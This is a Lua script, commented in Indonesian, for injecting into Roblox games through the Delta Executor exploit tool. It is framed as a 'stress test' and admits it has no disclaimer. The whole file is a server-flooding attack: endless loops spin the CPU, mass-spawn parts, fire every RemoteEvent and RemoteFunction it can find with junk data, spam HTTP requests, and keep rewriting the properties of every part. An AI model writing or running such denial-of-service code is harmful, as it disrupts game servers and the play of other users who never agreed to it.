-- Server overload script for Roblox (Delta Executor compatible)
-- Jalankan di executor. Gunakan dengan risiko sendiri (tidak ada disclaimer karena ini stress test).

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")

local localPlayer = Players.LocalPlayer
local serverTime = os.clock()

-- Fungsi untuk membuat beban CPU melalui loop intensif
local function cpuSpam()
    while true do
        local x = 0
        for i = 1, 100000 do
            x = x + math.sin(i) * math.cos(i)
        end
        RunService.Heartbeat:Wait() -- minimal wait, tetap membebani
    end
end

-- Fungsi untuk spam part di seluruh server (via remote? Tidak perlu, langsung buat di Workspace)
local function partSpam()
    while true do
        for i = 1, 500 do
            local part = Instance.new("Part")
            part.Size = Vector3.new(1,1,1)
            part.Anchored = true
            part.CFrame = CFrame.new(math.random(-5000,5000), math.random(0,1000), math.random(-5000,5000))
            part.Parent = Workspace
            -- Hapus setelah beberapa detik agar tidak overflow memori lokal? Tapi biarkan agar server sibuk.
            task.spawn(function()
                task.wait(5)
                part:Destroy()
            end)
        end
        task.wait(0) -- tanpa jeda
    end
end

-- Fungsi untuk spam remote event (jika ada event yang sering diproses server)
local function remoteSpam()
    -- Coba cari semua remote event di ReplicatedStorage dan kirim spam
    local remotes = {}
    local function scanRemotes(parent)
        for _, obj in ipairs(parent:GetChildren()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                table.insert(remotes, obj)
            elseif obj:IsA("Folder") or obj:IsA("Model") then
                scanRemotes(obj)
            end
        end
    end
    scanRemotes(ReplicatedStorage)
    scanRemotes(game:GetService("Players"))
    scanRemotes(game:GetService("Workspace"))
    
    while true do
        for _, remote in ipairs(remotes) do
            pcall(function()
                if remote:IsA("RemoteEvent") then
                    remote:FireServer("spam", math.random(1,1000000))
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer("spam")
                end
            end)
        end
        task.wait(0)
    end
end

-- Fungsi untuk spam HTTP request ke server (jika HttpService enabled, bisa membebani bandwidth)
local function httpSpam()
    if HttpService.HttpEnabled then
        local urls = {
            "https://httpbin.org/delay/1",
            "https://httpbin.org/post",
            "https://httpbin.org/get"
        }
        while true do
            for _, url in ipairs(urls) do
                pcall(function()
                    HttpService:GetAsync(url, true)
                end)
            end
            task.wait(0)
        end
    end
end

-- Eksekusi semua thread secara paralel
task.spawn(cpuSpam)
task.spawn(partSpam)
task.spawn(remoteSpam)
task.spawn(httpSpam)

-- Loop utama tambahan: spam perubahan property pada part di Workspace
while true do
    for _, part in ipairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            pcall(function()
                part.Transparency = math.random()
                part.Color = Color3.new(math.random(), math.random(), math.random())
            end)
        end
    end
    task.wait(0)
end
